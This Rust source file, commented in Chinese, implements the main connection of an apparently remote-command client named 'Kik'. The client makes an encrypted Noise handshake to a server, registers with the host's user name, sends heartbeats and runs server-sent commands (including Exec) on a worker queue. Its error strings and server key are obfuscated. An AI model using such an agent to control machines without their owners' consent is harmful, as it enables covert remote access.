//! Kik 主连接的 Noise 握手、注册、读循环、心跳和命令工作队列。
//!
//! 建连函数只有收到服务端 Kik ID 后才返回成功。读循环只解析和投递命令，最多 16 个命令任务并行执行，
//! 因而文件或 Exec 不会阻塞 Ping/Pong；主连接断开会结束本轮所有关联状态。

use crate::context::{Context, Kik, COMMAND_SENDER};
use crate::{cmd_util, read_handle};
use anyhow::Error;
use bytes::BytesMut;
use common::channel::{Channel, ChannelType};
use common::command::Command;
use common::config::Config;
use common::hidden;
use common::kik_info::KikInfo;
use common::ltc_codec::{
    LengthFieldBasedFrameDecoder, CONTROL_MAX_FRAME_LENGTH, INIT_MAX_FRAME_LENGTH,
};
use common::message::init_frame::InitFrame;
use common::noise_transport::connect_kik_noise;
use common::protocol;
use common::protocol::CmdOptions;
use std::sync::Arc;
use std::time::Duration;
use tokio::io::BufReader;
use tokio::sync::mpsc::Sender;
use tokio::sync::{mpsc, Mutex, Semaphore};
use tokio::task::{JoinHandle, JoinSet};
use tokio::time;
use tokio::time::timeout;
use tokio_stream::StreamExt;
use tokio_util::codec::FramedRead;
use tokio_util::task::AbortOnDropHandle;

pub(crate) const TASK_HELLO_ACK: common::channel::ChannelAttributeKey<
    tokio::sync::mpsc::Sender<()>,
> = common::channel::ChannelAttributeKey::new(0x7461_736b_6163_6b31);

/// 建立并注册一条 Kik 主连接，返回负责其余生命周期的后台读任务。
pub async fn kik_conn(context: Context, config: &Config) -> anyhow::Result<JoinHandle<()>> {
    let transport = connect_kik_noise(
        &config.server_host,
        &config.server_port,
        config.read_timeout,
        &common::generated::encrypted_strings::KIK_NOISE_SERVER_PUBLIC_KEY(),
    )
    .await?;
    // Kik 命令通道不传输大块数据，使用控制通道上限减少异常帧的内存影响。
    let framed_read = FramedRead::new(
        BufReader::new(transport.reader),
        LengthFieldBasedFrameDecoder::new_with_max_frame_len(INIT_MAX_FRAME_LENGTH),
    );
    let framed_arc = Arc::new(Mutex::new(framed_read));
    let channel_arc = Arc::new(Mutex::new(Channel::new(
        transport.writer,
        None,
        ChannelType::Unknown,
        transport.local_addr,
        transport.peer_addr,
    )));
    channel_arc
        .lock()
        .await
        .set_write_timeout(config.write_timeout);

    // 主动发送注册帧；此时角色仍是 Unknown，收到 KikId 后才切换为 Kik。
    let name = cmd_util::whoami();
    let channel = channel_arc.clone();
    handle_active(context.clone(), name.clone(), channel.clone()).await?;

    // 容量 1 的初始化通道只传一次 Kik ID，使调用方在返回前确认注册已完成。
    let (mut tx, mut rx) = mpsc::channel::<String>(1);

    let context_clone = context.clone();
    let channel_clone = channel_arc.clone();
    let read_timeout = config.read_timeout;
    let handle = AbortOnDropHandle::new(tokio::spawn(async move {
        let context = context_clone;
        let channel = channel_clone;
        // 心跳独立运行，命令任务变慢时仍能及时发现半开连接。
        let mut heartbeat_task = JoinSet::new();
        heartbeat_task.spawn(heartbeat(channel.clone()));

        let e = loop {
            // 读锁只包住 next().await，避免 match 臂内处理逻辑被临时锁生命周期拖住。
            let read_result = {
                let mut framed = framed_arc.lock().await;
                tokio::select! {
                    biased;
                    // 半关闭可能无法唤醒对端；心跳结束必须主动结束本地读等待，进入已有重连路径。
                    _ = heartbeat_task.join_next() => break None,
                    result = timeout(read_timeout, framed.next()) => result,
                }
            };

            match read_result {
                // 外层 timeout 区分“没有帧到达”和“解码/连接本身失败”。
                Ok(res) => {
                    match res {
                        Some(Ok(msg)) => {
                            // 解析器会把命令放入有界工作队列，不在网络读任务中执行。
                            let channel = channel.clone();
                            if let Err(error) =
                                handle_read(&context, channel.clone(), msg, &mut tx).await
                            {
                                dev_debug!("读取错误");
                                break Some(error);
                            }
                            if channel.lock().await.channel_type == ChannelType::Kik {
                                framed_arc
                                    .lock()
                                    .await
                                    .decoder_mut()
                                    .set_max_frame_len(CONTROL_MAX_FRAME_LENGTH);
                            }
                            continue;
                        }
                        Some(Err(e)) => {
                            dev_debug!("连接异常:{}", e);
                            break Some(anyhow::Error::new(e));
                        }
                        // `None` 表示对端正常关闭字节流，仍需进入统一 inactive 清理。
                        None => {
                            //不在这里对正常关闭进行特殊处理
                            break None;
                        }
                    }
                }
                Err(e) => {
                    break Some(anyhow::Error::new(e));
                }
            };
        };

        heartbeat_task.shutdown().await;
        if let Some(error) = e {
            let chan = channel.clone();
            handle_error(chan, error).await;
        }
        handle_inactive(context.clone(), channel.clone()).await;
    }));

    // 等待初始化通道中的唯一 Kik ID，确保调用者随后创建的数据连接绑定正确会话。
    let init_result = async {
        match timeout(read_timeout, rx.recv()).await {
            Ok(recv) => match recv {
                None => {
                    return Err(anyhow::Error::msg(hidden!("校验时连接断开")));
                }
                Some(kik_id) => {
                    {
                        let mut guard = channel_arc.lock().await;
                        guard.channel_type = ChannelType::Kik;
                        guard.set_id(kik_id.clone());
                    }
                    *context.id.lock().await = Some(kik_id);
                    let kik = Kik::new(channel_arc.clone());
                    let (hello_tx, mut hello_rx) = tokio::sync::mpsc::channel(1);
                    channel_arc
                        .lock()
                        .await
                        .insert_attribute(&TASK_HELLO_ACK, hello_tx);
                    context.set_kik(Some(kik.clone())).await;
                    channel_arc
                        .lock()
                        .await
                        .write_and_flush(&protocol::transfer_encode_frame(
                            common::message::kik_frame::KikFrame::Task(
                                common::task::TaskFrame::HelloNamed(kik.task_key),
                            ),
                        ))
                        .await?;
                    if !matches!(
                        timeout(Duration::from_secs(15), hello_rx.recv()).await,
                        Ok(Some(()))
                    ) {
                        return Err(anyhow::Error::msg(hidden!(
                            "服务端不支持任务文件名协议，请先升级服务端"
                        )));
                    }
                }
            },
            Err(_error) => {
                return Err(anyhow::Error::msg(hidden!("服务器超时未响应")));
            }
        };
        Ok(())
    }
    .await;
    if let Err(error) = init_result {
        // 注册或任务能力握手失败时先回收旧读任务，避免下一次建连后旧清理回调触碰新会话。
        handle.abort();
        let _ = handle.await;
        handle_inactive(context, channel_arc).await;
        return Err(error);
    }
    Ok(handle.detach())
}

async fn heartbeat(channel: Arc<Mutex<Channel>>) {
    loop {
        time::sleep(Duration::from_secs(5)).await;

        let mut guard = channel.lock().await;
        if guard.is_closed()
            || (guard.channel_type != ChannelType::Unknown
                && guard.write_and_flush(&protocol::kik_pong()).await.is_err())
        {
            guard.try_write_half_close().await;
            return;
        }
    }
}

async fn handle_active(
    context: Context,
    name: String,
    channel: Arc<Mutex<Channel>>,
) -> anyhow::Result<()> {
    // 发送注册请求后仍保持 Unknown；只有收到 KikId，外层状态机才发布 Kik 状态，
    // 避免服务端业务帧早于本地 ID 和命令队列初始化。
    channel
        .lock()
        .await
        .write_and_flush(&protocol::transfer_encode_frame(InitFrame::KikReq(
            KikInfo {
                id: context.id.clone().lock().await.clone(),
                name,
            },
        )))
        .await?;
    let (tx, mut rx) = tokio::sync::mpsc::channel::<(String, CmdOptions, Command)>(32);
    channel.lock().await.insert_attribute(&COMMAND_SENDER, tx);
    // Channel 属性持有 Sender，空闲 worker 只能持有 Weak，否则两者会互相保活，重连后无法释放。
    // 只有取得执行许可的具体命令才升级为 Arc，保持已经开始执行的命令原有生命周期。
    let weak_channel = Arc::downgrade(&channel);
    tokio::spawn(async move {
        let limit = Arc::new(Semaphore::new(16));
        while let Some((cmd_id, cmd_options, cmd)) = rx.recv().await {
            let Ok(permit) = limit.clone().acquire_owned().await else {
                break;
            };
            let Some(channel) = weak_channel.upgrade() else {
                break;
            };
            let context = context.clone();
            tokio::spawn(async move {
                let _permit = permit;
                read_handle::handle_kik_cmd(context, &channel, cmd_id, cmd_options, cmd).await;
            });
        }
    });
    Ok(())
}

async fn handle_inactive(context: Context, channel: Arc<Mutex<Channel>>) {
    channel.clone().lock().await.try_write_half_close().await;
    match context.get_kik().await {
        None => {}
        Some(ref kik) => {
            kik.delete_kik_conn().await;
        }
    }
}

async fn handle_error(_channel: Arc<Mutex<Channel>>, _error: Error) {
    dev_debug!("handle_error:{}", _error);
}

async fn handle_read(
    context: &Context,
    channel: Arc<Mutex<Channel>>,
    msg: BytesMut,
    auth_tx: &mut Sender<String>,
) -> anyhow::Result<()> {
    let channel_type = channel.lock().await.channel_type;
    match channel_type {
        ChannelType::Kik => read_handle::handle_kik(context, channel, msg).await,
        ChannelType::Unknown => {
            read_handle::handle_init_message(context, channel.clone(), msg, auth_tx).await?;
            channel.lock().await.channel_type = ChannelType::Kik;
            Ok(())
        }
        _ => Err(anyhow::Error::msg(hidden!("连接状态与帧类型不匹配"))),
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use tokio::io::AsyncReadExt;

    #[tokio::test]
    async fn idle_command_worker_does_not_keep_old_channel_alive() {
        let (writer, mut peer) = tokio::io::duplex(4096);
        let addr = "127.0.0.1:1".parse().unwrap();
        let channel = Arc::new(Mutex::new(Channel::new(
            Box::pin(writer),
            None,
            ChannelType::Unknown,
            Ok(addr),
            Ok(addr),
        )));
        let weak_channel = Arc::downgrade(&channel);
        let name = "worker-lifecycle-regression".to_string();
        let expected = protocol::transfer_encode_frame(InitFrame::KikReq(KikInfo {
            id: None,
            name: name.clone(),
        }));
        // 走真实注册入口建立 Channel -> Sender -> worker 关系；Context 尚未发布 Kik 主连接。
        timeout(
            Duration::from_secs(2),
            handle_active(Context::new(), name, channel.clone()),
        )
        .await
        .unwrap()
        .unwrap();
        assert!(channel.lock().await.attribute(&COMMAND_SENDER).is_some());
        tokio::task::yield_now().await;

        // 不显式 shutdown：若空闲 worker 仍捕获强引用，这里既不能释放 Channel，也读不到 EOF。
        drop(channel);
        assert!(weak_channel.upgrade().is_none());
        let mut received = Vec::new();
        timeout(Duration::from_secs(2), peer.read_to_end(&mut received))
            .await
            .expect("旧连接释放后，对端必须收到 EOF")
            .unwrap();
        assert_eq!(received, expected);
    }
}
